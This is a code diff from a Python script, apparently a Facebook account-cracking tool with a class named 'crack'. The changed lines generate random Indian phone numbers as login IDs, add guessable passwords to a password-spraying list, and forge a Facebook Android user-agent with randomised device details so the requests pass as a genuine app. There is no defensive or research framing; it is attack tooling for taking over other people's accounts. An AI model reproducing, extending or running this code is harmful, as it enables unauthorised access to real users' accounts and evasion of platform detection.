@@ -725,7 +725,7 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=720,height=1520};FBLC/es_ES;FBRV/0;FBCR/Banglalink;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.orca;FBDV/V20SE;FBSV/7;FBOP/3;FBCA/x64:arm64-v8a;]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=3.0,width=2560,height=1280};FBLC/es_ES;FBRV/366010365;FBCR/OPPO;FBMF/Apple;FBBD/Rivo;FBPN/com.facebook.orca;FBDV/Sony_Xperia_5D;FBSV/12;FBOP/8;FBCA/armeabi-v7a;FBSS/17;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
@@ -1085,7 +1085,8 @@ class crack:
             print (logo4)
             print ('\033[1;33mEnter Code 3 Digit indian Code\033[0;97m')
             print (43*'-')
-            print ('\033[1;33mExample 766,941,981,962,809,745,etc.\033[0;97m')
+            #print ('\033[1;33mExample 766,941,981,962,809,745,etc.\033[0;97m')
+            print ('\033[1;33mExample 76,94,98,96,80,74,97,etc.\033[0;97m')
             print (43*'-')
             os.system('rm -rf .num.txt')
             k = '91'
@@ -1099,7 +1100,7 @@ class crack:
             except:
                 cb = 5000
             for x in range(cb):
-                nmbr = ''.join(random.choice(string.digits) for _ in range(7))
+                nmbr = ''.join(random.choice(string.digits) for _ in range(8))
                 open('.num.txt', 'a').write(nmbr + '|' + '\n')
             self.id = open('.num.txt', 'r').read().splitlines()
             os.system('rm -rf .num.txt')
@@ -1110,7 +1111,7 @@ class crack:
             print ('\033[1;32m[2]Choice Password\033[0;97m')
             pas=input('\033[0;97mSelect: ')
             if pas == '1':
-                pwz=['57273200','59039200']
+                pwz=['57273200','59039200','number','57575752']
                 pwzz = '\n'.join(pwz)
                 pwzzz = (pwzz + '\n')
             elif pas == '2':
